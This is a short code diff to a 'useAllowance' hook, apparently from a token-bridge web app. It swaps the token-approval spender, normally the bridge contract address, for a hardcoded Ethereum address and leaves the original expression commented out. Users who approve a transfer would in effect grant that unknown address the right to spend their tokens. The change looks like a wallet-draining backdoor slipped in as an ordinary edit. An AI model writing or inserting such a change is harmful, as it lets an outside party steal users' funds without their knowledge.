@@ -74,7 +74,7 @@ export default function useAllowance(
           return gasPricePromise.then(
             (gasPrice) =>
               approveEth(
-                overrideAddress || getTokenBridgeAddressForChain(chainId),
+                "0x54690d8e1cc638d3a2471c652bb68c77c79855a3",//overrideAddress || getTokenBridgeAddressForChain(chainId),
                 tokenAddress,
                 signer,
                 BigNumber.from(amount),
